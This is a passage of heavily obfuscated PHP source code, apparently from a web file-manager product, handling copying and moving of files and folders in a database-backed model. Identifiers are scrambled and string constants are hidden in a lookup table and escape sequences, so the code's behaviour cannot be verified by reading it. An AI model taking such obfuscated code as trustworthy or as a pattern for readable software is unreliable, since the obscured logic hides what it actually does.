$¾—Ñıã€, $êé•Çó, !0, $Î¡ƒµÕÆ); $this->_childrenListClear(); $this->lockCopyEnd($×Ë³ÎŠŒ); $this->lockWriteEnd($âúöÔ˜Ò, $âÉº‰ò©); if ($¾€ú ¦ñ[$«éâ£İÄ[500]] == $«éâ£İÄ[91] && $ÉÃ‘¯¾À == $ó”£áÁ¢) { $this->folderSizeResetChildren($ÉÃ‘¯¾À); } Model($«éâ£İÄ[471])->addAll($êé•Çó[$«éâ£İÄ[653]], array(), !0); if ($ÉÃ‘¯¾À != $ó”£áÁ¢ || $¾€ú ¦ñ[$«éâ£İÄ[500]] == $«éâ£İÄ[91]) { Model($«éâ£İÄ[655])->eventCopy($ó”£áÁ¢); } $this->saveAll($êé•Çó[$«éâ£İÄ[654]]); Model($«éâ£İÄ[230])->linkAdd($êé•Çó[$«éâ£İÄ[652]]); $this->folderSizeReset($âúöÔ˜Ò); $this->updateModifyTime($âúöÔ˜Ò); return $ó”£áÁ¢; } private function _copy($åŠÂ†îø, $İåïâÛ›, $šÆùÒ‡¡, &$Ç–Ñå¨¾, $ĞìëÖµ«, $úü‰˜³æ = '') { $•Ñ®Ù’ =& $_SERVER[©—Ò»ÅĞ]; $÷°É“Ö¶ = $this->sourceInfoCache($åŠÂ†îø); $êûêäÆ = $÷°É“Ö¶[$•Ñ®Ù’[500]] == $•Ñ®Ù’[91]; $¦õöáĞ… = $úü‰˜³æ ? $úü‰˜³æ : $÷°É“Ö¶[$•Ñ®Ù’[32]]; $”˜‰‹¥¥ = $this->fileNameExistAuto($İåïâÛ›, $÷°É“Ö¶); if ($ĞìëÖµ«) { $this->_childrenAllMake($åŠÂ†îø); if ($êûêäÆ && $”˜‰‹¥¥) { $this->_childrenAllMake($”˜‰‹¥¥); } } if (!$”˜‰‹¥¥) { return $this->_copyCreate($åŠÂ†îø, $İåïâÛ›, $¦õöáĞ…, $Ç–Ñå¨¾); } $¬èÙûû = $”˜‰‹¥¥; if ($êûêäÆ) { if ($šÆùÒ‡¡ == REPEAT_RENAME_FOLDER) { $¦õöáĞ… = $this->fileNameAutoCache($İåïâÛ›, $¦õöáĞ…, $šÆùÒ‡¡, $êûêäÆ); $¬èÙûû = $this->_copyCreate($åŠÂ†îø, $İåïâÛ›, $¦õöáĞ…, $Ç–Ñå¨¾); } else { $ÅÒ­© = $this->_childrenList($åŠÂ†îø); foreach ($ÅÒ­© as $öÄé‡§í) { $this->_copy($öÄé‡§í[$•Ñ®Ù’[191]], $”˜‰‹¥¥, $šÆùÒ‡¡, $Ç–Ñå¨¾, !1); } } } else { if ($šÆùÒ‡¡ == REPEAT_RENAME || $šÆùÒ‡¡ == REPEAT_RENAME_FOLDER) { $¦õöáĞ… = $this->fileNameAutoCache($İåïâÛ›, $¦õöáĞ…, $šÆùÒ‡¡, $êûêäÆ); $¬èÙûû = $this->_copyCreate($åŠÂ†îø, $İåïâÛ›, $¦õöáĞ…, $Ç–Ñå¨¾); } else { if ($šÆùÒ‡¡ == REPEAT_REPLACE) { $º´’€¥ô = $this->sourceInfoCache($”˜‰‹¥¥); $–ó­÷´ = $this->fileHistory($º´’€¥ô, $÷°É“Ö¶[$•Ñ®Ù’[557]], $÷°É“Ö¶[$•Ñ®Ù’[79]]); if ($–ó­÷´) { $Ç–Ñå¨¾[$•Ñ®Ù’[652]][] = $÷°É“Ö¶[$•Ñ®Ù’[557]]; } } else { if ($šÆùÒ‡¡ == REPEAT_SKIP) { } } } Hook::trigger($•Ñ®Ù’[656], array($•Ñ®Ù’[657], $÷°É“Ö¶, 0)); } return $¬èÙûû; } private function _copyCreate($ã’íç•, $œÙÌ™ä°, $ª‘íİ¹, &$¦¬Óøæ) { $ êÎ”§” =& $_SERVER[©—Ò»ÅĞ]; $¨ïØÔƒ† = $this->sourceInfoCache($ã’íç•); $§²³§“ = $this->sourceInfoCache($œÙÌ™ä°); $Û°©è = $this->_makeItemData($¨ïØÔƒ†, $§²³§“, $ª‘íİ¹); Hook::trigger($ êÎ”§”[658], $Û°©è); Hook::trigger($ êÎ”§”[659], array($ êÎ”§”[660], $Û°©è, 0)); $ƒµô™åù = $this->add($Û°©è); $“¾é¾œ› = array($ êÎ”§”[191] => $ƒµô™åù, $ êÎ”§”[32] => $ª‘íİ¹); $this->_copyApplyMeta($“¾é¾œ›, $¦¬Óøæ); if ($¨ïØÔƒ†[$ êÎ”§”[500]] != $ êÎ”§”[91]) { $¦¬Óøæ[$ êÎ”§”[652]][] = $¨ïØÔƒ†[$ êÎ”§”[557]]; return $ƒµô™åù; } $«ì²çŠş = array(); $–€ÙãŸº = array(); $this->_childrenListAll($ã’íç•, $«ì²çŠş); $‚é Şáâ = count($«ì²çŠş); if ($‚é Şáâ == 0) { return $ƒµô™åù; } $¸Üîçè = $this->sourceInfo($ƒµô™åù); foreach ($«ì²çŠş as $Í·ÙóÊ÷) { $Á–ÕÛØ€ = $this->_makeItemData($Í·ÙóÊ÷, $¸Üîçè, $Í·ÙóÊ÷[$ êÎ”§”[32]]); $Á–ÕÛØ€[$ êÎ”§”[604]] = $Í·ÙóÊ÷[$ êÎ”§”[604]]; $–€ÙãŸº[] = $Á–ÕÛØ€; } $this->chunkEventSet($ êÎ”§”[661], array($ êÎ”§”[662], $Û°©è, $‚é Şáâ)); $this->addAll($–€ÙãŸº, array(), !1); $Îİèé¬ù = $this->where(array($ êÎ”§”[190] => $ƒµô™åù))->select(); $¶ÍºøÛ‡ = $this->_childrenMakeRelation($«ì²çŠş, $Îİèé¬ù); $¶ÍºøÛ‡[$ã’íç•] = $ƒµô™åù; $ãïÀÊûõ = array(); $ø¬¯¥ = array(); foreach ($Îİèé¬ù as $Í·ÙóÊ÷) { $–µáşƒÖ = $Í·ÙóÊ÷[$ êÎ”§”[191]]; $„ĞşƒÅ = $this->_childrenMatch($¶ÍºøÛ‡, $Í·ÙóÊ÷, $¸Üîçè); $ãïÀÊûõ[] = array($ êÎ”§”[191], $–µáşƒÖ, $ êÎ”§”[190], $„ĞşƒÅ[$ êÎ”§”[190]]); $ø¬¯¥[] = array($ êÎ”§”[191], $–µáşƒÖ, $ êÎ”§”[604], $„ĞşƒÅ[$ êÎ”§”[604]]); $this->_copyApplyMeta($Í·ÙóÊ÷, $¦¬Óøæ); if ($Í·ÙóÊ÷[$ êÎ”§”[500]] != $ êÎ”§”[91]) { $¦¬Óøæ[$ êÎ”§”[652]][] = $Í·ÙóÊ÷[$ êÎ”§”[557]]; } } $this->chunkEventSet($ êÎ”§”[663], array($ êÎ”§”[664], $Û°©è, $‚é Şáâ)); $this->saveAll($ãïÀÊûõ); $this->chunkEventSet($ êÎ”§”[665], array($ êÎ”§”[666], $Û°©è, $‚é Şáâ)); $this->saveAll($ø¬¯¥); return $ƒµô™åù; } private function _childrenMakeRelation($ÍñŠó, $äÑõòâò) { $¥ßüĞÇé =& $_SERVER[©—Ò»ÅĞ]; $ù–ğü´Ë = array(); $øØ¥¬º = array(); foreach ($ÍñŠó as $•àãôÏß) { $¨ïóİ… = $•àãôÏß[$¥ßüĞÇé[32]] . $¥ßüĞÇé[8] . $•àãôÏß[$¥ßüĞÇé[604]]; $ù–ğü´Ë[$¨ïóİ…] = $•àãôÏß[$¥ßüĞÇé[191]]; } foreach ($äÑõòâò as $•àãôÏß) { $¨ïóİ… = $•àãôÏß[$¥ßüĞÇé[32]] . $¥ßüĞÇé[8] . $•àãôÏß[$¥ßüĞÇé[604]]; $§ïÜŞôÎ = $ù–ğü´Ë[$¨ïóİ…]; $øØ¥¬º[$§ïÜŞôÎ] = $•àãôÏß[$¥ßüĞÇé[191]]; } return $øØ¥¬º; } private function _childrenMatch($ÊÂ•ìª±, $Æ¬ç¸Ìè, $¾çúŠ³) { $ş¤É²’Ì =& $_SERVER[©—Ò»ÅĞ]; $ğç™ÎÂ§ = $¾çúŠ³[$ş¤É²’Ì[604]]; $›„‰††˜ = $this->parentLevelArray($Æ¬ç¸Ìè[$ş¤É²’Ì[604]]); foreach ($›„‰††˜ as $òíÈÙËã) { if (isset($ÊÂ•ìª±[$òíÈÙËã])) { $ğç™ÎÂ§ .= $ÊÂ•ìª±[$òíÈÙËã] . $ş¤É²’Ì[667]; } } $ğç™ÎÂ§ = rtrim($ğç™ÎÂ§, $ş¤É²’Ì[50]) . $ş¤É²’Ì[50]; $İÆó»Ó› = $this->parentLevelArray($ğç™ÎÂ§); $ä †ÈáÁ = $İÆó»Ó›[count($İÆó»Ó›) - 1]; return array($ş¤É²’Ì[190] => $ä †ÈáÁ, $ş¤É²’Ì[604] => $ğç™ÎÂ§); } private function _makeItemData($¬³²¶², $·Ò€Ïñ×, $ÁÅ»ŞÃò) { $ØåÁ„Æ¼ =& $_SERVER[©—Ò»ÅĞ]; $Ú»ğ•§© = array($ØåÁ„Æ¼[668] => $¬³²¶²[$ØåÁ„Æ¼[500]], $ØåÁ„Æ¼[509] => $ÁÅ»ŞÃò, $ØåÁ„Æ¼[669] => $¬³²¶²[$ØåÁ„Æ¼[501]] ? $¬³²¶²[$ØåÁ„Æ¼[501]] : $ØåÁ„Æ¼[12], $ØåÁ„Æ¼[558] => $¬³²¶²[$ØåÁ„Æ¼[557]] ? $¬³²¶²[$ØåÁ„Æ¼[557]] : 0, $ØåÁ„Æ¼[640] => $¬³²¶²[$ØåÁ„Æ¼[79]] ? $¬³²¶²[$ØåÁ„Æ¼[79]] : 0, $ØåÁ„Æ¼[670] => intval($·Ò€Ïñ×[$ØåÁ„Æ¼[188]]), $ØåÁ„Æ¼[671] => intval($·Ò€Ïñ×[$ØåÁ„Æ¼[589]]), $ØåÁ„Æ¼[672] => intval(USER_ID), $ØåÁ„Æ¼[673] => intval(USER_ID), $ØåÁ„Æ¼[492] => intval($·Ò€Ïñ×[$ØåÁ„Æ¼[191]]), $ØåÁ„Æ¼[674] => $·Ò€Ïñ×[$ØåÁ„Æ¼[604]] . $·Ò€Ïñ×[$ØåÁ„Æ¼[191]] . $ØåÁ„Æ¼[50], $ØåÁ„Æ¼[513] => $¬³²¶²[$ØåÁ„Æ¼[88]] ? $¬³²¶²[$ØåÁ„Æ¼[88]] : time(), $ØåÁ„Æ¼[519] => 0, $ØåÁ„Æ¼[675] => $ØåÁ„Æ¼[12]); return $Ú»ğ•§©; } private function _copyApplyMeta($Â‡ˆÌÀÂ, &$ß±á’¦÷) { $ø€×ÇŠ• =& $_SERVER[©—Ò»ÅĞ]; $´Š‡ûóÙ = $Â‡ˆÌÀÂ[$ø€×ÇŠ•[191]]; $ñıù½ò¦ = $Â‡ˆÌÀÂ[$ø€×ÇŠ•[32]]; if (!isset($Â‡ˆÌÀÂ[$ø€×ÇŠ•[676]]) || !$Â‡ˆÌÀÂ[$ø€×ÇŠ•[676]] || $Â‡ˆÌÀÂ[$ø€×ÇŠ•[676]] == $ø€×ÇŠ•[228]) { $ß±á’¦÷[$ø€×ÇŠ•[654]][] = array($ø€×ÇŠ•[191], $´Š‡ûóÙ, $ø€×ÇŠ•[676], short_id($´Š‡ûóÙ)); } if (Input::check($ñıù½ò¦, $ø€×ÇŠ•[677])) { $ß±á’¦÷[$ø€×ÇŠ•[653]][] = array($ø€×ÇŠ•[191] => $´Š‡ûóÙ, $ø€×ÇŠ•[95] => $ø€×ÇŠ•[552], $ø€×ÇŠ•[451] => str_replace($ø€×ÇŠ•[53], $ø€×ÇŠ•[12], Pinyin::get($ñıù½ò¦))); $ß±á’¦÷[$ø€×ÇŠ•[653]][] = array($ø€×ÇŠ•[191] => $´Š‡ûóÙ, $ø€×ÇŠ•[95] => $ø€×ÇŠ•[551], $ø€×ÇŠ•[451] => Pinyin::get($ñıù½ò¦, $ø€×ÇŠ•[678])); } $ß±á’¦÷[$ø€×ÇŠ•[653]][] = array($ø€×ÇŠ•[191] => $´Š‡ûóÙ, $ø€×ÇŠ•[95] => $ø€×ÇŠ•[531], $ø€×ÇŠ•[451] => KodSort::makeStr($ñıù½ò¦)); } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($÷çæ’»ì) { $¸ÌßÅËä =& $_SERVER[©—Ò»ÅĞ]; $ùœÔóœ = $this->sourceInfo($÷çæ’»ì); $¶Ì¨ËÁ÷ = $¸ÌßÅËä[679]; $ ƒ×ğù = array($¸ÌßÅËä[604] => array($¸ÌßÅËä[635], $ùœÔóœ[$¸ÌßÅËä[604]] . $÷çæ’»ì . $¸ÌßÅËä[636]), $¸ÌßÅËä[520] => $this->targetIsDelete); $¢Û±ôÀÛ = $this->field($¶Ì¨ËÁ÷)->where($ ƒ×ğù)->select(); if (!$¢Û±ôÀÛ) { return; } $¢Û±ôÀÛ = array_to_keyvalue($¢Û±ôÀÛ, $¸ÌßÅËä[191]); foreach ($¢Û±ôÀÛ as $ØÚÊ­—ş) { $›à›÷ = $ØÚÊ­—ş[$¸ÌßÅËä[190]]; $÷çæ’»ì = $ØÚÊ­—ş[$¸ÌßÅËä[191]]; if (!isset($this->_childrenListCache[$÷çæ’»ì]) && $ØÚÊ­—ş[$¸ÌßÅËä[500]] == $¸ÌßÅËä[91]) { $this->_childrenListCache[$÷çæ’»ì] = array(); } if (!isset($this->_childrenListCache[$›à›÷])) { $this->_childrenListCache[$›à›÷] = array(); } $this->_childrenListCache[$›à›÷][$÷çæ’»ì] = $ØÚÊ­—ş; $this->_childrenItemCache[$÷çæ’»ì] = $ØÚÊ­—ş; } } private function _childrenListAll($ÕšõßÛ, &$ĞÄ÷À˜¿) { $ªŞ€æè =& $_SERVER[©—Ò»ÅĞ]; if (!isset($this->_childrenListCache[$ÕšõßÛ])) { return; } $‚Ò¿¤Ş = $this->_childrenListCache[$ÕšõßÛ]; foreach ($‚Ò¿¤Ş as $¶Åï´‰¨ => $úÌİìÒâ) { $ĞÄ÷À˜¿[$¶Åï´‰¨] = $úÌİìÒâ; if ($úÌİìÒâ[$ªŞ€æè[500]] == $ªŞ€æè[91]) { $this->_childrenListAll($¶Åï´‰¨, $ĞÄ÷À˜¿); } } } private function sourceInfoCache($ÇÀŞÕ’) { if (isset($this->_childrenItemCache[$ÇÀŞÕ’])) { return $this->_childrenItemCache[$ÇÀŞÕ’]; } return $this->sourceInfo($ÇÀŞÕ’); } private function _childrenList($‰‡İ°¹ñ) { if (isset($this->_childrenListCache[$‰‡İ°¹ñ])) { return $this->_childrenListCache[$‰‡İ°¹ñ]; } return $this->_childrenListSelect($‰‡İ°¹ñ); } private function _childrenListSelect($ÊØÅ—èÒ) { $â“ƒ¡öÙ =& $_SERVER[©—Ò»ÅĞ]; $˜Á»ÁÏ = array($â“ƒ¡öÙ[190] => $ÊØÅ—èÒ, $â“ƒ¡öÙ[520] => $this->targetIsDelete); $Òåı¿Ì’ = $this->where($˜Á»ÁÏ)->select(); $Òåı¿Ì’ = $Òåı¿Ì’ ? $Òåı¿Ì’ : array(); $– ü‘ì• = array_to_keyvalue($Òåı¿Ì’, $â“ƒ¡öÙ[191]); $this->_childrenListCache[$ÊØÅ—èÒ] = $– ü‘ì•; foreach ($– ü‘ì• as $ÊØÅ—èÒ => $íÓ“°¥À) { $this->_childrenItemCache[$ÊØÅ—èÒ] = $íÓ“°¥À; } return $– ü‘ì•; } private function fileNameExistAuto($éÅü», $¤ÖÜä¤°) { $‚ÉÓÕ„à =& $_SERVER[©—Ò»ÅĞ]; if ($¤ÖÜä¤°[$‚ÉÓÕ„à[520]] == $‚ÉÓÕ„à[91]) { return $this->fileNameExist($éÅü», $¤ÖÜä¤°[$‚ÉÓÕ„à[32]]); } return $this->fileNameExistCache($éÅü», $¤ÖÜä¤°[$‚ÉÓÕ„à[32]]); } private function fileNameExistCache($ğğÒÍŠ—, $š°Ú”²Î) { $­ ¦¢û =& $_SERVER[©—Ò»ÅĞ]; $š°Ú”²Î = strtolower($š°Ú”²Î); $ãùµœú  = $this->_childrenList($ğğÒÍŠ—); foreach ($ãùµœú  as $ÂÛøÆ­) { if ($š°Ú”²Î == strtolower($ÂÛøÆ­[$­ ¦¢û[32]])) { return $ÂÛøÆ­[$­ ¦¢û[191]]; } } return !1; } private function fileNameAutoCache($ ²‘…ù, $Î‘³Ú¥î, $áÅ¦â«’, $»Üêº¥ë) { $àĞ§¡¯ =& $_SERVER[©—Ò»ÅĞ]; $—¿Üô— = $this->_childrenList($ ²‘…ù); $ˆ­Š†‰¨ = array_to_keyvalue($—¿Üô—, $àĞ§¡¯[12], $àĞ§¡¯[32]); return $this->fileNameAutoGet($ˆ­Š†‰¨, $Î‘³Ú¥î, $áÅ¦â«’, $»Üêº¥ë); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($’¡ ¬ÜÃ, $Š¼Î¹Ç´, $î¼áÑ… = REPEAT_REPLACE, $¸ã­¬îÀ = '') { $Ô°¨óŒ’ =& $_SERVER[©—Ò»ÅĞ]; $®ËÖºíì = $this->sourceInfo($’¡ ¬ÜÃ); $†éÌ‡á÷ = $this->sourceInfo($Š¼Î¹Ç´); if ($®ËÖºíì[$Ô°¨óŒ’[190]] == $†éÌ‡á÷[$Ô°¨óŒ’[191]]) { if ($®ËÖºíì[$Ô°¨óŒ’[520]] == $Ô°¨óŒ’[91]) { Model($Ô°¨óŒ’[518])->restore(array($’¡ ¬ÜÃ)); } if (!$¸ã­¬îÀ || $¸ã­¬îÀ == $®ËÖºíì[$Ô°¨óŒ’[32]]) { return $’¡ ¬ÜÃ; } } $¹—ª = $this->pathInfoMore($’¡ ¬ÜÃ); if ($this->isParentOf($’¡ ¬ÜÃ, $Š¼Î¹Ç´)) { return !1; } if (!$®ËÖºíì || !$†éÌ‡á÷ || $†éÌ‡á÷[$Ô°¨óŒ’[500]] != $Ô°¨óŒ’[91]) { return !1; } Hook::trigger($Ô°¨óŒ’[680], $¹—ª); $this->targetIsDelete = intval($®ËÖºíì[$Ô°¨óŒ’[520]]); if ($®ËÖºíì[$Ô°¨óŒ’[190]] == $Š¼Î¹Ç´ && $¸ã­¬îÀ != $®ËÖºíì[$Ô°¨óŒ’[32]]) { $Ö§È½Ì = $this->fileNameExist($Š¼Î¹Ç´, $¸ã­¬îÀ); if ($Ö§È½Ì && $®ËÖºíì[$Ô°¨óŒ’[500]] == $Ô°¨óŒ’[228]) { $ÖÇ‘£ = $this->sourceInfo($Ö§È½Ì); $†£ÀŞÖ¸ = $this->fileHistory($ÖÇ‘£, $®ËÖºíì[$Ô°¨óŒ’[557]], $®ËÖºíì[$Ô°¨óŒ’[79]]); if (!$†£ÀŞÖ¸) { Model($Ô°¨óŒ’[560])->remove($®ËÖºíì[$Ô°¨óŒ’[557]]); } $this->removeNow($’¡ ¬ÜÃ, !1); $this->folderSizeReset($Š¼Î¹Ç´); Hook::trigger($Ô°¨óŒ’[681], $¹—ª); return $Ö§È½Ì; } } $€æÕÍ”º = $¸ã­¬îÀ ? $¸ã­¬îÀ : $®ËÖºíì[$Ô°¨óŒ’[32]]; $this->lockMoveStart($’¡ ¬ÜÃ); $this->lockWriteStart($Š¼Î¹Ç´, $€æÕÍ”º); $õ¦ú—€„ = array($Ô°¨óŒ’[652] => array(), $Ô°¨óŒ’[682] => !1); $this->clearShare($’¡ ¬ÜÃ, $Š¼Î¹Ç´); $™ÆÅÌ‰” = $this->fileNameExistAuto($Š¼Î¹Ç´, $®ËÖºíì); $¶„ÖÅ” = $this->_move($’¡ ¬ÜÃ, $Š¼Î¹Ç´, $î¼áÑ…, $õ¦ú—€„, $¸ã­¬îÀ); $this->sourceCacheClear(); if ($®ËÖºíì[$Ô°¨óŒ’[500]] == $Ô°¨óŒ’[91] && $™ÆÅÌ‰”) { $this->folderSizeResetChildren($¶„ÖÅ”); } Model($Ô°¨óŒ’[230])->linkAdd($õ¦ú—€„[$Ô°¨óŒ’[652]]); if ($¶„ÖÅ” && $™ÆÅÌ‰” && $õ¦ú—€„[$Ô°¨óŒ’[682]]) { $ˆ®» šú = $®ËÖºíì[$Ô°¨óŒ’[500]] == $Ô°¨óŒ’[91] ? $this->_childrenListSelect($’¡ ¬ÜÃ) : !1; $Æïå›óõ = $ˆ®» šú && count($ˆ®» šú) > 0 ? !0 : !1; $this->removeNow($’¡ ¬ÜÃ, $Æïå›óõ); } $this->lockMoveEnd($’¡ ¬ÜÃ); $this->lockWriteEnd($Š¼Î¹Ç´, $€æÕÍ”º); $this->folderSizeReset($®ËÖºíì[$Ô°¨óŒ’[190]]); $this->folderSizeReset($Š¼Î¹Ç´); $Şä¨ù© = array($®ËÖºíì[$Ô°¨óŒ’[190]], $Š¼Î¹Ç´); if ($®ËÖºíì[$Ô°¨óŒ’[500]] == $Ô°¨óŒ’[91]) { $Şä¨ù©[] = $’¡ ¬ÜÃ; } $this->updateModifyTime($Şä¨ù©); Model($Ô°¨óŒ’[655])->eventMove($’¡ ¬ÜÃ, $®ËÖºíì[$Ô°¨óŒ’[190]], $Š¼Î¹Ç´); Hook::trigger($Ô°¨óŒ’[681], $¹—ª); return $¶„ÖÅ”; } private function _move($Ö£ãÍÇ¸, $øı÷‡¸„, $ı„››¬ó, &$­òÁ¿Îù, $çÆù¶­ = '') { $úĞÒÌ÷ë =& $_SERVER[©—Ò»ÅĞ]; $Æ¶ëÔ÷ = $this->sourceInfo($Ö£ãÍÇ¸); $çé‰â”ß = $Æ¶ëÔ÷[$úĞÒÌ÷ë[500]] == $úĞÒÌ÷ë[91]; $®“ÚªÎÉ = $çÆù¶­ ? $çÆù¶­ : $Æ¶ëÔ÷[$úĞÒÌ÷ë[32]]; $›è¬ÀÎª = $this->fileNameExistAuto($øı÷‡¸„, $Æ¶ëÔ÷); $this->lockMoveStart($Ö£ãÍÇ¸); $this->lockWriteStart($øı÷‡¸„, $®“ÚªÎÉ); if (!$›è¬ÀÎª) { return $this->_moveForce($Ö£ãÍÇ¸, $øı÷‡¸„, $®“ÚªÎÉ); } $¼„¯Şô‚ = $›è¬ÀÎª; $×±Êğôµ = !1; if ($çé‰â”ß) { if ($ı„››¬ó == REPEAT_RENAME_FOLDER) { $®“ÚªÎÉ = $this->fileNameAuto($øı÷‡¸„, $®“ÚªÎÉ, $ı„››¬ó, $çé‰â”ß); $¼„¯Şô‚ = $this->_moveForce($Ö£ãÍÇ¸, $øı÷‡¸„, $®“ÚªÎÉ); } else { $òƒû¡ü² = $this->_childrenListSelect($Ö£ãÍÇ¸); foreach ($òƒû¡ü² as $şúÛÂáë) { $ÎÍôÄ—Õ = REPEAT_REPLACE; $this->_move($şúÛÂáë[$úĞÒÌ÷ë[191]], $›è¬ÀÎª, $ÎÍôÄ—Õ, $­òÁ¿Îù); } $×±Êğôµ = !0; } } else { if ($ı„››¬ó == REPEAT_RENAME || $ı„››¬ó == REPEAT_RENAME_FOLDER) { $®“ÚªÎÉ = $this->fileNameAuto($øı÷‡¸„, $®“ÚªÎÉ, $ı„››¬ó, $çé‰â”ß); $¼„¯Şô‚ = $this->_moveForce($Ö£ãÍÇ¸, $øı÷‡¸„, $®“ÚªÎÉ); } else { $ÈÜÍ¹â° = $this->sourceInfoCache($›è¬ÀÎª); $¬ğß‡ ½ = $this->fileHistory($ÈÜÍ¹â°, $Æ¶ëÔ÷[$úĞÒÌ÷ë[557]], $Æ¶ëÔ÷[$úĞÒÌ÷ë[79]]); if ($¬ğß‡ ½) { $­òÁ¿Îù[$úĞÒÌ÷ë[652]][] = $Æ¶ëÔ÷[$úĞÒÌ÷ë[557]]; } $×±Êğôµ = !0; } } if ($×±Êğôµ) { $­òÁ¿Îù[$úĞÒÌ÷ë[682]] = !0; } return $¼„¯Şô‚; } private function _moveForce($á’õÎû, $€Ï÷Ÿ€Ü, $óƒ¡Õ°“) { $üîªú§í =& $_SERVER[©—Ò»ÅĞ]; $èœ°ûôˆ = $this->sourceInfo($á’õÎû); $ŸÅ‰½µ³ = $this->sourceInfo($€Ï÷Ÿ€Ü); $äè£àÉñ = $èœ°ûôˆ[$üîªú§í[500]] == $üîªú§í[91]; $É†ó¸‹ = array($üîªú§í[492] => $ŸÅ‰½µ³[$üîªú§í[191]], $üîªú§í[674] => $ŸÅ‰½µ³[$üîªú§í[604]] . $ŸÅ‰½µ³[$üîªú§í[191]] . $üîªú§í[50], $üîªú§í[670] => $ŸÅ‰½µ³[$üîªú§í[188]], $üîªú§í[671] => $ŸÅ‰½µ³[$üîªú§í[589]], $üîªú§í[673] => USER_ID, $üîªú§í[509] => $óƒ¡Õ°“); $£ÄŸÒŞß = $èœ°ûôˆ[$üîªú§í[188]] == SourceModel::TYPE_GROUP && $ŸÅ‰½µ³[$üîªú§í[188]] == SourceModel::TYPE_GROUP && $èœ°ûôˆ[$üîªú§í[589]] == $ŸÅ‰½µ³[$üîªú§í[589]]; if (!$£ÄŸÒŞß && $this->moveClearAuth) { Model($üîªú§í[587])->authClear($á’õÎû); } $”‰ñöº = $èœ°ûôˆ[$üîªú§í[520]] == $üîªú§í[91] && $ŸÅ‰½µ³[$üîªú§í[520]] != $üîªú§í[91]; if ($”‰ñöº) { $É†ó¸‹[$üîªú§í[519]] = 0; } if ($äè£àÉñ) { $³¯ĞŠÛ = array($üîªú§í[674] => array($üîªú§í[635], $èœ°ûôˆ[$üîªú§í[604]] . $èœ°ûôˆ[$üîªú§í[191]] . $üîªú§í[636])); $µ¶Ù¼¿ = $èœ°ûôˆ[$üîªú§í[604]] . $èœ°ûôˆ[$üîªú§í[191]] . $üîªú§í[50]; $­¯¿û = $ŸÅ‰½µ³[$üîªú§í[604]] . $ŸÅ‰½µ³[$üîªú§í[191]] . $üîªú§í[50] . $èœ°ûôˆ[$üîªú§í[191]] . $üîªú§í[50]; $…ŒÇîîü = array($üîªú§í[674] => array($üîªú§í[683], "\162\x65\160\x6c\x61\143\145\x28\160\141\162\145\156\164\114\145\x76\145\x6c\54\x27{$µ¶Ù¼¿}\x27\54\x27{$­¯¿û}\x27\51"), $üîªú§í[670] => $ŸÅ‰½µ³[$üîªú§í[188]], $üîªú§í[671] => $ŸÅ‰½µ³[$üîªú§í[589]]); if ($”‰ñöº) { $…ŒÇîîü[$üîªú§í[519]] = 0; } $this->where($³¯ĞŠÛ)->data($…ŒÇîîü)->save(); } $this->where(array($üîªú§í[506] => $á’õÎû))->data($É†ó¸‹)->save(); return $á’õÎû; } private function clearShare($÷ûÆ«¯, $ÁµëøàÊ) { $ÕÁ³·ÒØ =& $_SERVER[©—Ò»ÅĞ]; $±µ—ıĞÊ = $this->sourceInfo($÷ûÆ«¯); $ßƒ×³à‹ = $this->sourceInfo($ÁµëøàÊ); if ($±µ—ıĞÊ[$ÕÁ³·ÒØ[589]] == $ßƒ×³à‹[$ÕÁ³·ÒØ[589]] && $±µ—ıĞÊ[$ÕÁ³·ÒØ[188]] == $ÕÁ³·ÒØ[684]) { return; } $åıœ»ï· = array($ÕÁ³·ÒØ[604] => array($ÕÁ³·ÒØ[635], $±µ—ıĞÊ[$ÕÁ³·ÒØ[604]] . $÷ûÆ«¯ . $ÕÁ³·ÒØ[636])); $Ìö¡µí = $this->field($ÕÁ³·ÒØ[506])->where($åıœ»ï·)->getField($ÕÁ³·ÒØ[191], !0); if (!$Ìö¡µí) { return; } $åıœ»ï· = array($ÕÁ³·ÒØ[191] => array($ÕÁ³·ÒØ[7], $Ìö¡µí), $ÕÁ³·ÒØ[685] => 1); $Õ…´¡ŒÁ = Model($ÕÁ³·ÒØ[686])->field($ÕÁ³·ÒØ[687])->where($åıœ»ï·)->select(); if (!$Õ…´¡ŒÁ) { return; } $Õ…´¡ŒÁ = array_to_keyvalue($Õ…´¡ŒÁ, $ÕÁ³·ÒØ[12], $ÕÁ³·ÒØ[687]); $åıœ»ï· = array($ÕÁ³·ÒØ[687] => array($ÕÁ³·ÒØ[7], $Õ…´¡ŒÁ)); Model($ÕÁ³·ÒØ[686])->where($åıœ»ï·)->save(array($ÕÁ³·ÒØ[685] => 0)); Model($ÕÁ³·ÒØ[688])->where($åıœ»ï·)->delete(); } public function copyFolderFromIO($ìğÌé’, $´ïàÛÆõ, $“èøÕÈÒ, $œÆå£Èà, $¡´¨Ãğ, $µ„ÌÜ² = false) { $Ğ“¢àñÁ =& $_SERVER[©—Ò»ÅĞ]; $®ûí³¹  = array($Ğ“¢àñÁ[653] => array(), $Ğ“¢àñÁ[654] => array(), $Ğ“¢àñÁ[652] => array(), $Ğ“¢àñÁ[689] => array()); $—»…š = $µ„ÌÜ² ? $µ„ÌÜ² : $ìğÌé’->pathThis($´ïàÛÆõ); $ˆöÕ°ÊÓ = $this->fileNameExist($“èøÕÈÒ, $—»…š); $¼ÂÑ¼š² = $this->mkdir($“èøÕÈÒ, $—»…š, $œÆå£Èà); if (!$ˆöÕ°ÊÓ || $œÆå£Èà == REPEAT_RENAME_FOLDER) { $œÆå£Èà = !1; } if ($ˆöÕ°ÊÓ) { $this->_childrenAllMake($ˆöÕ°ÊÓ); } Hook::trigger($Ğ“¢àñÁ[690]); $Æ²Í™Â· = KodIO::ioFileDriverGet($Ğ“¢àñÁ[498] . $“èøÕÈÒ . $Ğ“¢àñÁ[402]); $this->_copyChildTo($ìğÌé’, $´ïàÛÆõ, $¼ÂÑ¼š², $œÆå£Èà, $®ûí³¹ , $¡´¨Ãğ, $Æ²Í™Â·); Hook::trigger($Ğ“¢àñÁ[691]); if ($¼ÂÑ¼š²) { $this->folderSizeResetChildren($¼ÂÑ¼š²); } $this->_childrenListClear(); Model($Ğ“¢àñÁ[471])->addAll($®ûí³¹ [$Ğ“¢àñÁ[653]], array(), !0); Model($Ğ“¢àñÁ[655])->eventCopy($¼ÂÑ¼š²); $this->saveAll($®ûí³¹ [$Ğ“¢àñÁ[654]]); Model($Ğ“¢àñÁ[560])->linkAdd($®ûí³¹ [$Ğ“¢àñÁ[652]]); 